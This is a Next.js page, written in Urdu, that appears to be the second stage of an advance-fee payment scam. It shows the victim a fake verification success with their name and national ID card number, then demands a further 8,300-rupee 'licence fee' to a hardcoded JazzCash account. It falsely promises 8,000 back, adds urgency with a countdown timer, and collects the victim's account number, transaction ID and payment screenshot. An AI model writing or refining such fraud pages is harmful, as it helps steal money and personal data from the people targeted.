"use client";
import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { AlertCircle } from "lucide-react";

function Payment2Content() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const userName = searchParams.get('name') || 'صارف';
  const cnic = searchParams.get('cnic') || '00000-0000000-0';
  const payment1Amount = searchParams.get('amount') || '5000';
  const tidPayment1 = searchParams.get('tid') || 'N/A';

  // Get account info dynamically from localStorage (admin panel)
  const [accountName, setAccountName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const newFee = 8300;

  const [timeLeft, setTimeLeft] = useState(29 * 60 + 43);
  const [tidNumber, setTidNumber] = useState('');
  const [screenshot, setScreenshot] = useState('');
  const [userAccountNumber, setUserAccountNumber] = useState(''); // NEW FIELD

  useEffect(() => {
    setAccountName(localStorage.getItem('jazzcashName') || 'Jazzcash – LIAQUAT ALI');
    setAccountNumber(localStorage.getItem('jazzcashNumber') || '03487375087');
  }, []);

  useEffect(() => {
    const timer = setInterval(() => setTimeLeft(prev => (prev <= 0 ? (clearInterval(timer), 0) : prev - 1)), 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => `${Math.floor(seconds/60)}:${(seconds%60).toString().padStart(2,'0')}`;

  const handleFileChange = (e) => {
    const file = e.target.files?.[0];
    if(file) setScreenshot(file);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if(!userAccountNumber) return alert("براہ کرم اپنا اکاؤنٹ نمبر درج کریں");
    if(!tidNumber) return alert("براہ کرم TID نمبر درج کریں");
    if(!screenshot) return alert("براہ کرم اسکرین شاٹ اپلوڈ کریں");

    router.push(`/final-success?name=${encodeURIComponent(userName)}&token=${tidNumber}&amount=${newFee}&userAccount=${encodeURIComponent(userAccountNumber)}`);
  };

  useEffect(() => {
  console.log("CNIC:", cnic);
}, [cnic]);


  return (
    <main className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-white py-4 px-3">
      <div className="max-w-lg mx-auto">

        <div className="bg-pink-50 border-2 border-pink-400 rounded-2xl p-4 mb-4 text-center shadow-lg">
          <p className="text-gray-700 text-sm mb-2 font-semibold" dir="rtl">ٹوکن کینسل ہونے کا وقت</p>
          <div className="text-4xl font-bold text-pink-600 bg-white rounded-xl py-3 shadow-inner">{formatTime(timeLeft)}</div>
        </div>

        <div className="bg-white rounded-3xl shadow-2xl p-6 mb-4">
          <h2 className="text-2xl font-bold text-center mb-6 text-gray-800" dir="rtl">نیا لائسنس فیس</h2>

          <div className="bg-green-50 border-2 border-green-400 rounded-2xl p-4 mb-6">
            <p className="text-green-800 font-bold text-center mb-2" dir="rtl">✓ تصدیق کامیاب!</p>
            <div className="space-y-1 text-sm text-green-700 text-center">
              <p dir="rtl">معزز {userName}، شناختی کارڈ: {cnic}</p>
              <p dir="rtl">ٹوکن: {tidPayment1} کی بنیادی فیس موصول ہو گئی ہے۔</p>
            </div>
          </div>

          <div className="bg-pink-50 rounded-2xl p-4 mb-6 text-center">
            <p className="text-gray-800 font-bold text-lg mb-1">{accountName}</p>
            <p className="text-3xl font-bold text-pink-600">{accountNumber}</p>
            <p className="text-sm text-gray-600 mt-2" dir="rtl">اکاؤنٹ نمبر کاپی کریں</p>
          </div>

          <div className="text-center mb-6">
            <p className="text-gray-700 mb-1" dir="rtl">نیا لائسنس لاگو:</p>
            <p className="text-sm text-gray-600 mb-2" dir="rtl">لائسنس، اپروول فیس</p>
            <div className="bg-gradient-to-r from-red-500 to-pink-500 text-white rounded-2xl py-4 px-6 inline-block shadow-xl">
              <span className="text-5xl font-bold">{newFee}</span>
              <span className="text-2xl mr-2" dir="rtl">روپے</span>
            </div>
          </div>

          <div className="bg-orange-50 border-l-4 border-orange-500 p-4 mb-6 flex items-start gap-2">
            <AlertCircle className="text-orange-600 flex-shrink-0 mt-1" size={20}/>
            <div>
              <p className="text-orange-800 font-bold mb-2 text-sm" dir="rtl">ضروری انتباہ:</p>
              <p className="text-sm text-orange-700 mb-2" dir="rtl">
                براہِ کرم اس پیغام کو غور سے پڑھیں۔ آپ کو 8,300 روپے کی رقم ارسال کرنا ہوگی۔ رقم بھیجنے کے بعد اس کا اسکرین شاٹ ضرور فراہم کریں۔ اس رقم میں سے 8,000 روپے آپ کو واپس کر دیے جائیں گے، جبکہ 300 روپے بطور اپروول فیس رکھے جائیں گے۔ براہِ کرم نیچے اپنا اکاؤنٹ نمبر بھی درج کریں تاکہ فیس کی رقم آپ کو واپس کی جا سکے۔ شکریہ۔
              </p>
              <p className="text-xs text-red-600 font-bold" dir="rtl">
                براہ کرم اسکرین شاٹ بھیجیں، ورنہ لائسنس کی لائسنس کنسل ہو سکتا ہے۔
              </p>
            </div>
          </div>

          {/* New User Account Number Field */}
          <div className="mb-4">
            <label className="block text-gray-700 font-semibold mb-2 text-right" dir="rtl">اپنا اکاؤنٹ نمبر درج کریں:</label>
            <input 
              type="text" 
              value={userAccountNumber} 
              onChange={e=>setUserAccountNumber(e.target.value)} 
              placeholder="مثال: 03XXXXXXXXX" 
              className="w-full px-4 py-3 border-2 border-blue-400 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none"
            />
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 font-semibold mb-2 text-right" dir="rtl">TID (ٹرانزیکشن آئی ڈی):</label>
            <input type="text" value={tidNumber} onChange={e=>setTidNumber(e.target.value)} placeholder="e.g. 1234567890" className="w-full px-4 py-3 border-2 border-green-400 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none"/>
          </div>

          <div className="mb-6">
            <label className="block text-gray-700 font-semibold mb-2 text-right" dir="rtl">اپلوڈ پیمنٹ اسکرین شاٹ:</label>
            <input type="file" onChange={handleFileChange} accept="image/*" className="w-full px-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-green-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:bg-green-600 file:text-white file:cursor-pointer hover:file:bg-green-700"/>
            {screenshot && <p className="text-sm text-green-600 mt-2 flex items-center gap-2">✓ {screenshot.name}</p>}
          </div>

          <button onClick={handleSubmit} className="group relative w-full bg-gradient-to-r from-green-600 via-green-700 to-green-600 hover:from-green-700 hover:via-green-800 hover:to-green-700 text-white py-5 rounded-full text-xl font-bold transition-all duration-500 shadow-2xl hover:shadow-green-500/50 transform hover:scale-105 active:scale-95 overflow-hidden">
            <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-0 group-hover:opacity-30 transform -skew-x-12 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000"></span>
            <span className="relative">Confirm Payment</span>
          </button>
        </div>
      </div>
    </main>
  );
}

export default function Payment2Page() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center">Loading...</div>}>
      <Payment2Content />
    </Suspense>
  );
}
